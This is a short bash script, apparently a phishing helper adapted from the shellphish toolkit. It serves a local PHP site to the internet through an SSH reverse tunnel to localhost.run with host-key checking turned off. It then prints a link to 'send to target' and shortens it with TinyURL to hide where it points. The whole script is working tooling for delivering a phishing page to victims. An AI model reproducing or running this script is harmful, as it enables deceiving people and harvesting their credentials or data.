#!/bin/bash
# kalitor v0.1
# Creates a PHP server that runs through Serveo.

servelocalhost() {
# code from shellphish
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd site && php -S 127.0.0.1:$lport > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:80 ssh.localhost.run 2> /dev/null > sendlink ' &
printf "\n"
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.localhost.run" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
read me
killall ssh
killall php
}
printf "What is the local port running the server?"
read lport
killall ssh
killall php
servelocalhost
